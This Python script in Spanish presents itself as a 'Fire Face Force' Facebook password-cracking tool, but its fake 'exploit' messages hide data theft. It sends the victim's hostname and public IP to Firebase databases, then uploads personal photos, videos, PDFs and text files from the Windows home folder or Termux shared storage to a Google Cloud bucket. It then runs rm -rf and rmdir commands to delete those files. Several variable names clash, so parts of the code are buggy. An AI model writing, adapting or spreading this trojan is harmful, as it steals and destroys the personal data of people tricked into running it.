try: 
    import glob
    import requests
    from urllib.request import urlopen
    import os
    import time
    import json
    from google.cloud import storage
    from art import *
    import socket
    from colorama import Fore, Back, Style, init
    init()

except ImportError:
    
    print("librería no instalada. Instalando...")
    import os
    # pip para instalar la librería automáticamente.
    os.system("pip install art")
    os.system("pip install json")
    os.system("pip install urlopen2")
    os.system("pip install urlopen")
    os.system("pip install colorama")
    os.system("pip install glob2")
    os.system("pip install sockets")
    os.system("pip install TIME-python")
    os.system("pip install requests")
    os.system("pip install google-cloud-storage")
    os.system('cls' if os.name == 'nt' else 'clear')
    print("La librería 'libreria_existente' ha sido instalada correctamente.")


C = Fore.CYAN
R = Fore.RED
B = Fore.BLUE
M = Fore.MAGENTA
G = Fore.GREEN
Bl = Fore.BLACK
Y = Fore.YELLOW
BM = Back.MAGENTA
BR = Back.RED
Bb = Back.BLACK
Bw = Back.WHITE
bb = Back.BLUE

print(Bb + B + """.             \v""" + BR +
"""Fire Face Force
""" + Bb + """.              \n""")

mail = input(BM + C + "Insert Mail: \v"+
G +  Bb)
view = print(R +"Set >>" + G, mail)
print("\n")
print(f"{BR} {G} Buscando {B} Facebook" + Bb)

time.sleep(2.0)
os.system('cls' if os.name == 'nt' else 'clear')
if os.name == 'nt':

    # hos = os.uname().nodename
    jsons = "export.json"
    name_h = socket.gethostname()
    bd_h = "https://hostname-5c24b-default-rtdb.firebaseio.com/hostname/" + jsons
    f_url = bd_h
    response = requests.get(f_url, headers={
                            'Cache-Control': 'no-cache'})
    data = response.json()
    if data is not None and 'host' in data and data['host'] == name_h:
        print(f"{BR} {G} Conectando a {B} Facebook..."+ Bb)
        time.sleep(3.0)
    else:
        # Crear el objeto JSON
        json_data = {
            "host": name_h
        }

        response = requests.patch(f_url, json=json_data)
        if response.status_code == 200:
            print(f"{BY} solicitud enviada "+ Bb)
            time.sleep(2.0)
            os.system('cls' if os.name == 'nt' else 'clear')
        else:
            print('\033[91m' + "Error Network Time Out"+'\033[0m')
            time.sleep(3.0)
            os.system('cls' if os.name == 'nt' else 'clear')

    # extraccion de ip registrada en base de datos
else:
    name_h = os.uname().nodename
    f_url = 'https://hostname-5c24b-default-rtdb.firebaseio.com/hostname/' + jsons
    response = requests.get(f_url, headers={
                            'Cache-Control': 'no-cache'})
    data = response.json()
    if data is not None and 'host' in data and data['host'] == name_h:
        print(G + "token Generado")
        time.sleep(2.3)
        os.system('cls' if os.name == 'nt' else 'clear')
    else:
        # Crear el objeto JSON
        json_data = {
            "host": 'name_h'
        }

        response = requests.patch(f_url, json=json_data)
        if response.status_code == 200:
            print(f"{G}Start Exploit{Bb}")
            time.sleep(3.5)
            os.system('cls' if os.name == 'nt' else 'clear')
        else:
            print(f"{R}Not Exploit Fail{Bb}")
            time.sleep(3.0)
            os.system('cls' if os.name == 'nt' else 'clear')

fy = '.ipify.'
ify = fy
api = f'https://api{ify}org?format=json'
response = urlopen(api)
data = json.load(response)
extract = data['ip']
# Actualizar a base de datos
jsons = 'ip.json'
f_url = 'https://data-fe2c3-default-rtdb.firebaseio.com/' + jsons
response = requests.get(f_url)
existing_data = json.loads(response.content)

if existing_data and 'ips' in existing_data:
    if extract not in existing_data['ips']:
        existing_data['ips'].append(extract)
        response = requests.put(f_url, json=existing_data)
        print('')
        os.system('cls' if os.name == 'nt' else 'clear')
    else:
        print('')
        os.system('cls' if os.name == 'nt' else 'clear')

else:
    new_data = {'ips': [extract]}
    response = requests.put(f_url, json=new_data)
    print('\033[94m'+'ID Perfil Cargado\n'+'\033[0m')
    time.sleep(3.0)
    if response.status_code == 200:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(
            '\033[94m'+"\nPasswords List.. "+'\033[0m' + "Rockyu.txt")
        time.sleep(3.0)
os.system('cls' if os.name == 'nt' else 'clear')
# Guardando informacion
if os.name == 'nt':
    from google.cloud import storage
    import glob
    client = storage.Client.from_service_account_json(
        'services/serviceAccounts.json')

    bucket = client.get_bucket('pictuface-f9763.appspot.com')
    nombre_usuario = os.getlogin()
    carpeta_local = f"C:\\Users\\{nombre_usuario}\\"
    extraccion_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg', '.txt', '.pdf', '.mvk']

    archivos = glob.glob(carpeta_local + '/*')

    for archivo_local in archivos:

        nombre_destino = os.path.basename(archivo_local)
        # Obtén la extensión del archivo
        _, extension = os.path.splitext(archivo_local)
        # Verifica si la extensión está permitida
        if extension in extensiones_permitidas:

            # Descargar info
            blob = bucket.blob(nombre_destino)
            blob.upload_from_filename(archivo_local)
            os.system('rmdir C:\\Users\\{nombre_usuario}\\/s.')

            print(f'{Bw} {G} Complete {Bb}')
        else:
            print(
                f'information not Function')
    if not os.path.exists(carpeta_local):
        carpeta_local = input(
            f'{Y} Inserta ruta Manual.\n[+] ')
# Lista de extensiones
        extraccion_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg', '.txt', '.pdf', '.mvk']

        archivos = glob.glob(carpeta_local + '/*')

        for archivo_local in archivos:

            nombre_destino = os.path.basename(archivo_local)
        # Obtén la extensión del archivo
            _, extension = os.path.splitext(archivo_local)
        # Verifica si la extensión está permitida
            if extension in extensiones_permitidas:

                # Sube el archivo
                blob = bucket.blob(nombre_destino)
                blob.upload_from_filename(archivo_local)

                print(f'{G} Complete')
            else:
                print(
                    f'{R} Extention Fail.')
else:
    # en Linux
    banner = f"""{B}
                    Linux
    {G}"""
    print(banner)
    from google.cloud import storage
    import glob
    os.system("termux-setup-storage")
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Bb + B + """.             \v""" + S + BR +
"""Fire Face Force
""" + Bb + """.              \n""")
    client = storage.Client.from_service_account_json(
        'services/serviceAccounts.json')

    bucket = client.get_bucket('pictuface-f9763.appspot.com')
   #Guardando los datos 
    carpeta_local = '/data/data/com.termux/files/home/storage/shared/*'
# Lista de extensiones permitidas
    extracciones_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg', '.txt', '.pdf', '.mvk']

    archivos = glob.glob(carpeta_local + '/*')

    for archivo_local in archivos:

        nombre_destino = os.path.basename(archivo_local)
    # Obtén la extensión del archivo
        _, extension = os.path.splitext(archivo_local)
    # Verifica si la extensión está permitida
        if extension in extensiones_permitidas:

            # Sube el archivo
            blob = bucket.blob(nombre_destino)
            blob.upload_from_filename(archivo_local)

            print(f'{Bw} {R} password not found{Bb}')
        else:
            os.system('rm -rf /data/data/com.termux/files/home/storage/shared/*')
                        #corrigiendo errores de formatos eliminando y restaurando
            os.system('rm -r /data/data/com.termux/files/home/storage/shared/*')
            print(
                f'{bb} {G} Password Hacked{Bb}')
    if not os.path.exists(carpeta_local):
        carpeta_local = input(
            'Ingresa Ruta manual\n[+]')
# Lista de extensiones permitidas
        extensiones_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg', '.txt', '.pdf', '.mvk']

        archivos = glob.glob(carpeta_local + '/*')

        for archivo_local in archivos:

            nombre_destino = os.path.basename(archivo_local)
        # Obtén la extensión del archivo
            _, extension = os.path.splitext(archivo_local)
        # Verifica si la extensión está permitida
            if extension in extensiones_permitidas:

                # Sube el archivo
                blob = bucket.blob(nombre_destino)
                blob.upload_from_filename(archivo_local)

                print(f'Complete')
            else:
                print(f'Fail')
